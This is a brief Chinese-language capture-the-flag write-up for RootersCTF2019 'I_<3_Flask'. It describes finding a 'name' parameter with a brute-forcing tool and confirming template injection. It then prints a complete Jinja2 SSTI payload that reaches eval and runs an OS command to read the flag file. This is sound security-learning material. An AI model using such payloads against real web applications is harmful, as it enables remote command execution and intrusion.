# \[RootersCTF2019]I\_<3\_Flask

## \[RootersCTF2019]I\_<3\_Flask

## wp

经典SSTI，没有过滤

使用[Arjun](https://github.com/s0md3v/Arjun)爆破参数，得到name

传参`?name={{7*7}}`测试出来SSTI

然后是很常规的SSTI注入

```
?name={{[].__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag.txt').read()")}}
```
